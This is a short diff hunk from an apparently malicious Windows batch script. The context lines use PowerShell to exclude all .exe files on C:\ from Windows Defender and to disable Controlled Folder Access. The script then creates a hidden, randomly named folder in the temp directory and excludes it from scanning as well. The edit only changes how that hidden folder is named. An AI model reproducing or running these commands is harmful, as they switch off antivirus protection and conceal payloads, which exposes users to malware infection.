@@ -107,7 +107,7 @@ powershell Add-MpPreference -ExclusionPath 'C:\*.exe'
 powershell Set-MpPreference -ControlledFolderAccess Disabled
 
 REM Create hidden and random folder
-set "hiddenFolder=%temp%.{%RANDOM%-%RANDOM%-%RANDOM%-%RANDOM%-%RANDOM%}"
+set "hiddenFolder=%temp%\.%RANDOM%%RANDOM%%RANDOM%%RANDOM%"
 mkdir "%hiddenFolder%"
 
 REM Exclude hidden folder from Windows Defender
